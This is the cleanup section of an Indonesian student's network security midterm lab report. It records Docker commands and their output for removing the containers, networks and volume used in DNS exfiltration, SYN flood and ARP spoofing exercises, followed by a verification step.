Tahap cleanup dilakukan untuk menghentikan dan menghapus seluruh resource Docker yang dibuat selama pelaksanaan UTS Keamanan Jaringan Kasus 7.

Resource yang dibersihkan meliputi container, network, dan volume yang digunakan pada praktikum. Proses ini dilakukan secara spesifik agar tidak menghapus resource dari praktikum lain.

### B. Menghapus Resource Tugas 7 – DNS Exfiltration

Perintah yang digunakan:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml down
```

Hasil:

```text
[+] down 3/3
✔ Container k7-dns-1      Removed
✔ Container k7-attacker-1 Removed
! Network k7_lab          Resource is still in use
```

Analisis:

Container DNS dan attacker berhasil dihapus. Namun, network `k7_lab` belum dapat dihapus karena masih digunakan oleh container dari praktikum lain dalam project Compose yang sama, yaitu container Tugas 6. Oleh karena itu, proses cleanup dilanjutkan dengan menghapus resource Tugas 6 terlebih dahulu.

### C. Menghapus Resource Tugas 6 – SYN Flood

Perintah yang digunakan:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml down
```

Hasil:

```text
[+] down 2/2
✔ Container k7-target-1 Removed
✔ Network k7_lab        Removed
```

Analisis:

Container target dari Tugas 6 berhasil dihapus. Setelah container tersebut tidak lagi menggunakan network, network `k7_lab` juga berhasil dihapus.

### D. Menghapus Resource Tugas 3 – ARP Spoofing

Tiga container yang dibuat untuk simulasi ARP Spoofing adalah `korban-k7`, `gateway-k7`, dan `penyerang-k7`.

Perintah yang digunakan:

```powershell
docker rm -f korban-k7 gateway-k7 penyerang-k7
```

Hasil:

```text
korban-k7
gateway-k7
penyerang-k7
```

Selanjutnya, network khusus ARP Spoofing dihapus menggunakan perintah:

```powershell
docker network rm lab-arp-k7
```

Hasil:

```text
lab-arp-k7
```

Analisis:

Ketiga container berhasil dihapus, kemudian network `lab-arp-k7` juga berhasil dihapus karena tidak lagi digunakan oleh container.

### E. Menghapus Volume Tugas 1 – Docker Volume

Sebelum penghapusan, volume diperiksa menggunakan perintah:

```powershell
docker volume ls --filter name=vol-k7
```

Hasil pemeriksaan awal:

```text
DRIVER    VOLUME NAME
local     vol-k7
```

Volume kemudian dihapus menggunakan perintah:

```powershell
docker volume rm vol-k7
```

Hasil:

```text
vol-k7
```

Analisis:

Volume `vol-k7` berhasil dihapus setelah digunakan untuk menguji persistensi data pada Tugas 1.

### F. Verifikasi Container

Pemeriksaan dilakukan untuk memastikan tidak ada container UTS Kasus 7 yang masih tersisa.

Perintah:

```powershell
docker ps -a --filter "name=k7" --filter "name=korban-k7" --filter "name=gateway-k7" --filter "name=penyerang-k7"
```

Hasil:

```text
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

Analisis:

Hasil pemeriksaan hanya menampilkan header tabel tanpa data container. Hal ini menunjukkan bahwa container UTS Kasus 7 yang menjadi target cleanup sudah tidak tersisa.

### G. Verifikasi Network

Perintah:

```powershell
docker network ls
```

Hasil pemeriksaan menunjukkan bahwa network `k7_lab` dan `lab-arp-k7` sudah tidak ditemukan.

Network lain yang masih tersedia, seperti `l3-lab_dhcp-network`, `l4-lab_l4-lab`, dan `wifi-lab_wifi_network`, tetap dipertahankan karena berasal dari praktikum lain.

### H. Verifikasi Volume

Perintah:

```powershell
docker volume ls --filter name=vol-k7
```

Hasil:

```text
DRIVER    VOLUME NAME
```

Analisis:

Tidak ada volume dengan nama `vol-k7` yang ditemukan. Dengan demikian, volume yang dibuat untuk Tugas 1 telah berhasil dihapus.

### I. Kesimpulan Cleanup

Berdasarkan proses cleanup dan verifikasi yang telah dilakukan, seluruh resource Docker yang dibuat khusus untuk UTS Keamanan Jaringan Kasus 7 berhasil dibersihkan.

Container dari Tugas 3, Tugas 6, dan Tugas 7 telah dihapus. Network `k7_lab` dan `lab-arp-k7` juga berhasil dihapus. Selain itu, volume `vol-k7` dari Tugas 1 telah dihapus dan diverifikasi tidak lagi tersedia.

Pembersihan dilakukan secara spesifik menggunakan perintah Docker berdasarkan nama container, network, dan volume. Resource dari praktikum lain tetap dipertahankan sehingga tidak terjadi penghapusan yang tidak diperlukan.

Dengan demikian, proses cleanup UTS Keamanan Jaringan Kasus 7 telah selesai.

